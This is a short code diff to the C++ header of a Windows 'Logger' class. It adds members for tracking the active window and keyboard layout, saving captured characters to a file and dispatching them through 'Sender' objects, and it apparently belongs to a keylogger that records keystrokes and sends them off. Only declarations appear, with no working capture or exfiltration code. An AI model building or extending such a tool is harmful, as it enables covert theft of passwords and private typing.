@@ -4,6 +4,9 @@
 #include <vector>
 #include <Windows.h>
 #include <iostream>
+#include <fstream>
+#include "Sender.h"
+#include "FabricSender.h"
 
 #define MAKELANGID(p, s)       ((((WORD  )(s)) << 10) | (WORD  )(p))
 #define PRIMARYLANGID(lgid)    ((WORD  )(lgid) & 0x3ff)
@@ -20,14 +23,21 @@ private:
 	bool is_capslock = false;
 	static map <int, vector<char>> btnKeyRu;
 	static map <int, vector<char>> btnKeyEn;
+	DWORD processId;
+	HWND hwnd;
+	HKL kLayout;
+	wchar_t wChar;
 	Logger();
-public:
-	static Logger* getInstance();
 	void put(char simbol);
 	string get();
-	int saveEng(int key);
-	int saveRu(int key);
+	void saver();
+	bool checkUpper();
+	char toUpper(char letter);
+	char toLower(char letter);
+	void saveToFile();
+	static Sender** array_senders;
+public:
+	static Logger* getInstance();
 	static void run();
-	static void fillBtnKey();
 };
 
